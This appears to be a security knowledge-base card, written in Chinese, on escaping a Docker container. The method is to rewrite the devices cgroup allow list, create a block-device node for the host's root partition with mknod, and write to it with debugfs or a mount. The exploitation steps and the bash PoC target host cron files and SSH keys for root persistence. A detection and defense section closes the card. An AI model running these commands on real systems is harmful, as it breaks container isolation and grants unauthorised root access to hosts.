---
id: cloud-container-docker-devices-allow-mknod-debugfs-escape
title: Docker devices cgroup 提权逃逸：改写 devices.allow=a + mountinfo 取宿主根分区 major:minor + mknod 块设备，ext 用 debugfs 直写/xfs 挂载后写计划任务
type: scenario
domain: cloud
path: cloud/container
technique: docker-devices-allow-mknod-debugfs-escape
tags:
- docker
- container
- escape
- cgroup
- devices
- mknod
- debugfs
- block-device
- xfs
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V571
  verified_at: '2026-11-12T09:32:19+08:00'
  notes: 已对照原文与截图核对：图09 devices.allow 逃逸流程图（挂载 devices 子系统→/proc/self/cgroup 取容器ID→devices.allow=a→mountinfo grep /etc 取宿主机 major:minor→mknod→ext 用 debugfs/xfs 挂载→写计划任务/ssh→Pwned）与卡内步骤一一对应；图10 实测命令链（mount -o devices /tmp/dev、cgroup /docker/1edc...、echo a > devices.allow、mountinfo 得到 8:1 /dev/sda1 ext4、mknod host b 8 1、debugfs -w host 成功进入 debugfs 1.46.5）证明块设备读写宿主根分区打通；图14 mount host /tmp/pwn 后 ls 见宿主机根目录，验证挂载写路径。卡内 PoC 与截图一致（mountinfo 示例中 mount-id 409/根字段为示意，关键 8:1 与图10 吻合）。原文 devices 章节文字较简，细节来自流程图与截图，卡片如实还原；最终写 crontab/ssh 为流程图给出的下一步，debugfs/mount 已实证宿主文件系统读写权限。无受影响版本声明，未设 affected_versions。dedup：privileged 挂盘、bind mount 写 crontab、procfs、SUID docker 卡均 related 非同链（入口为 devices cgroup 白名单改写+mknod）；dup-scan 无本卡 pair。未执行文中命令。
url: /docs/cloud/container/cloud-container-docker-devices-allow-mknod-debugfs-escape/
draft: false
kb_aliases:
- devices.allow 逃逸
- devices cgroup 容器逃逸
- mknod 块设备 debugfs
- /proc/self/mountinfo major minor
- 容器内 debugfs 写宿主机文件
---

## 一句话结论

当容器可写 cgroup v1 的 `devices` 子系统时，把当前容器的 `devices.allow` 写成 `a`（放开全部设备），再读 `/proc/self/mountinfo` 取得宿主机根分区设备号（如 `8:1`），用 `mknod` 创建对应块设备节点；ext2/3/4 根分区可用 `debugfs -w` 直接改写宿主机文件（如计划任务/SSH 公钥），XFS 则挂载设备后写入，从而在宿主机落地 root 权限持久化，完成容器逃逸。

## 原理

- **devices cgroup 的作用**：cgroup v1 的 `devices` 子系统通过 `devices.allow`/`devices.deny`（格式 `type major:minor access`，type 为 a/c/b，access 为 r/w/m 组合）为容器内任务配置设备黑白名单；默认 Docker 只允许少量设备，`mknod` 与访问真实块设备被禁止。
- **改写白名单**：若容器内可以挂载/写入 `devices` cgroup（privileged 或 cgroup 配置不当），向当前容器 cgroup 的 `devices.allow` 写入 `a` 即允许所有设备访问与 mknod。
- **定位容器 cgroup 与宿主分区**：`cat /proc/self/cgroup | grep docker` 得到当前容器在 devices 子系统中的 cgroup 路径（`/docker/<容器ID>`）；`cat /proc/self/mountinfo | grep /etc` 可见宿主机 bind mount（如 `/etc/resolv.conf`）背后的源设备 `major:minor`（例 `8:1` 即 `/dev/sda1`），说明该块设备就是宿主机根分区。
- **mknod 与直接写盘**：放开 devices 限制后 `mknod host b 8 1` 在容器内创建块设备节点；此后：
  - ext2/ext3/ext4：`debugfs -w host` 可不解挂载直接读写文件系统内文件，向 `/etc/cron.d/`、`/root/.ssh/authorized_keys` 等写内容；
  - xfs：`mount host /tmp/pwn` 挂载后按普通文件写入。
- **为什么成立**：容器与宿主机共享内核和设备；文件系统隔离依赖 devices cgroup 与挂载命名空间。一旦 devices 白名单被容器自身改写，块设备节点可创建且可访问，容器就能绕过文件系统层直接修改宿主根分区数据，root 权限文件（crontab/SSH key）随之可写。
- **边界**：需要容器对 devices cgroup 有写权限（通常来自 privileged、`CAP_SYS_ADMIN` 或错误挂载）；只读/受保护设备、SELinux/AppArmor 策略、rootless 与 cgroup v2 下可能失败；XFS 的挂载写入还取决于内核是否允许容器内 mount 块设备。

## 触发条件

- 容器内可挂载 `devices` cgroup 并写 `devices.allow`（或容器以 privileged 运行，此时还有更直接的挂载路径）。
- 宿主机根分区为 ext2/3/4（可 debugfs）或 xfs（可挂载），且块设备号可从 mountinfo 获得。
- 内核/发行版未通过 LSM（SELinux/AppArmor）阻止 mknod 与块设备访问。

## 利用步骤

1. 挂载 devices 子系统：`mkdir /tmp/dev && mount -t cgroup -o devices devices /tmp/dev`。
2. 定位当前容器 cgroup：`cat /proc/self/cgroup | grep docker | head -1`，进入 `/tmp/dev/docker/<容器ID>/`。
3. 放开设备白名单：`echo a > devices.allow`。
4. 取宿主根分区设备号：`cat /proc/self/mountinfo | grep /etc | head -1`，读源设备 `major:minor`（如 `8:1`）。
5. 创建块设备节点：`cd /tmp && mknod host b 8 1`。
6. 写入宿主机文件：
   - ext：`debugfs -w host`（交互内 `write <本地文件> /etc/cron.d/x` 或改 authorized_keys）；
   - xfs：`mkdir /tmp/pwn && mount host /tmp/pwn` 后直接写 `/tmp/pwn/etc/...`。
7. 通过计划任务/SSH 公钥在宿主机获得 root 执行/登录，验证逃逸。

最小化 PoC：

```bash
mkdir /tmp/dev && mount -t cgroup -o devices devices /tmp/dev
cd /tmp/dev/docker/$(cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3)/
echo a > devices.allow
cat /proc/self/mountinfo | grep /etc | head -1     # 例 409 588 8:1 / /etc/resolv.conf ...
cd /tmp && mknod host b 8 1
debugfs -w host                                   # ext2/3/4：直接写宿主文件
# 或 xfs: mkdir /tmp/pwn && mount host /tmp/pwn
```

## 变体与关联

- 特权容器直接 `mount /dev/sda1 /pwn; chroot /pwn` 是同一目标的更短路径（已有卡）；本链针对「不能直接 mount 但能改写 devices cgroup」的配置。
- 容器挂载宿主机目录（bind mount）时可直接改 `/etc/crontab`（已有卡）；本链绕过目录挂载直接操作块设备。
- 通用 debugfs 提权（disk 组用户直接读块设备）与本链原理相通，只是入口从容器 cgroup 变为本地用户组。
- 另一条相邻路径是 cgroup v1 notify_on_release 逃逸（release_agent 在宿主机 root 执行）。

## 检测与防御

- 不把 devices cgroup 挂载/写权限交给容器；不以 privileged/`CAP_SYS_ADMIN` 运行不可信容器。
- seccomp 阻止 `mknod`/`mount`，AppArmor/SELinux 限制块设备访问；使用 rootless Docker 与 cgroup v2。
- 运行时检测：容器内 `mount -t cgroup -o devices`、写 `devices.allow` 为 `a`、`mknod` 块设备、`debugfs` 访问设备节点等行为；监控宿主机 crontab/authorized_keys 变更。
